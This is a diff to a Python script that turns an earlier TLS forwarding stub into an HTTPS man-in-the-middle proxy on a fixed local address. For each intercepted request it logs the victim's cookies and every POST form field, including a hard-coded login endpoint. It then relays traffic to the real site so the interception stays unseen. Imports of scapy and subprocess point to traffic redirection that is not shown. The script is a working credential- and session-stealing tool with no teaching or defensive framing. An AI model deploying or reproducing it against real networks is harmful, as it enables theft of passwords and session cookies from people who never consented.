@@ -4,80 +4,89 @@ import http.client
 import os
 import socket
 import codecs
-
-
-'''class MySSL_TCPServer(TCPServer):
-    def __init__(self,
-                 server_address,
-                 RequestHandlerClass,
-                 certfile,
-                 keyfile,
-                 ssl_version=ssl.PROTOCOL_TLSv1,
-                 bind_and_activate=True):
-        TCPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
-        self.allow_reuse_address = True
-        self.certfile = certfile
-        self.keyfile = keyfile
-        self.ssl_version = ssl_version
-
-    def get_request(self):
-        newsocket, fromaddr = self.socket.accept()
-        connstream = ssl.wrap_socket(newsocket,
-                                 server_side=True,
-                                 certfile = self.certfile,
-                                 keyfile = self.keyfile,
-                                 ssl_version = self.ssl_version)
-        return connstream, fromaddr
-
-class MySSL_ThreadingTCPServer(ThreadingMixIn, MySSL_TCPServer): pass
-
-class testHandler(StreamRequestHandler):
-    def handle(self):
-        data = self.connection.recv(8096).decode('utf-8')
-        while not data.endswith('\r\n\r\n'):
-            data += self.connection.recv(8096).decode('utf-8')
-
-        data = data.split('\r\n')
-        GET = data[0].split(' ')[1]
-        headers = {}
-        for i in range(1, len(data)):
-            line = data[i].split(': ')
-            if len(line) >= 2:
-                headers[line[0]] = line[1]
-
-        print(GET)
-        #print(headers)
-
-        conn = http.client.HTTPSConnection("444.hu")
-        conn.request("GET", GET)
-        r1 = conn.getresponse()
-        print(r1.status, r1.reason)
-        data1 = r1.read()  # This will return entire content.
-        #print(data1)
-
-        self.wfile.write(data1)
-        print("---- sent ----")
-#test code
-MySSL_ThreadingTCPServer(('192.168.0.23',4433),testHandler,"cert.pem","key.pem").serve_forever()'''
-
-
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl
+import netifaces as ni
+from scapy.all import *
+import subprocess
+from cgi import parse_header, parse_multipart
+from urllib.parse import parse_qs
+import http.client, urllib.parse
+
+
+host_ip = "192.168.0.23"
 
 class MyHandler(BaseHTTPRequestHandler):
 
-    def do_GET(s):
-        print('[**] ', s.path)
+    def do_GET(self):
+        print('[*] GET', self.headers['Host'] + "/" + self.path)
 
-        conn = http.client.HTTPSConnection(s.headers['Host'])
-        conn.request("GET", s.path)
+        try:
+            hs = {}
+            for h in self.headers:
+                if str(h) != 'Accept-Encoding':
+                    hs[h] = self.headers[h]
+            print("\t\tcookie: ", self.headers['Cookie'])
+            print("\n")
+            conn = http.client.HTTPSConnection(self.headers['Host'])
+            conn.request("GET", self.path, headers=hs) # TODO check if headers are working
+            r1 = conn.getresponse()
+            #print(r1.status, r1.reason)
+            data1 = r1.read()
+
+            self.wfile.write(b'HTTP/1.1 200 OK')
+            for h in r1.headers:
+                if str(h) != 'Vary':
+                    self.send_header(h, r1.headers[h])
+            self.end_headers()
+            self.wfile.write(data1)
+        except Exception as e:
+            print(e)
+
+
+    def parse_POST(self):
+        ctype, pdict = parse_header(self.headers['content-type'])
+        if ctype == 'multipart/form-data':
+            postvars = parse_multipart(self.rfile, pdict)
+        elif ctype == 'application/x-www-form-urlencoded':
+            length = int(self.headers['content-length'])
+            postvars = parse_qs(
+                self.rfile.read(length),
+                keep_blank_values=1)
+        else:
+            postvars = {}
+        return postvars
+
+    def do_POST(self):
+        print("[*] POST " + self.headers['Host'] + " " + self.path)
+        tmp = self.parse_POST()
+        postvars = {}
+
+        print("\t\tcookie: ", self.headers['Cookie'])
+        for v in tmp:
+            postvars[v.decode('ascii')] = tmp[v][0].decode('ascii')
+        params = urllib.parse.urlencode(postvars)
+
+        print("\t\tPOST variables:")
+        for v in postvars:
+            print('\t\t\t', v, ": ", postvars[v])
+        print("\n")
+        hs = {}
+        for h in self.headers:
+            hs[h] = self.headers[h]
+        conn = http.client.HTTPSConnection(self.headers['Host'])
+        conn.request("POST", "/index.php?show=login", params, hs)  # TODO check if headers are working
         r1 = conn.getresponse()
-        print(r1.status, r1.reason)
+        #print(r1.status, r1.reason)
         data1 = r1.read()  # This will return entire content.
-        #print(data1)
-        s.wfile.write(data1)
-        print("-------------")
+        self.wfile.write(b'HTTP/1.1 200 OK')
+        for h in r1.headers:
+            self.send_header(h, r1.headers[h])
+        self.end_headers()
+        self.wfile.write(data1)
 
-httpd = HTTPServer(('192.168.0.23', 4433), MyHandler)
+
+
+httpd = HTTPServer((host_ip, 4433), MyHandler)
 httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True, cert_reqs=ssl.CERT_OPTIONAL)
 httpd.serve_forever()
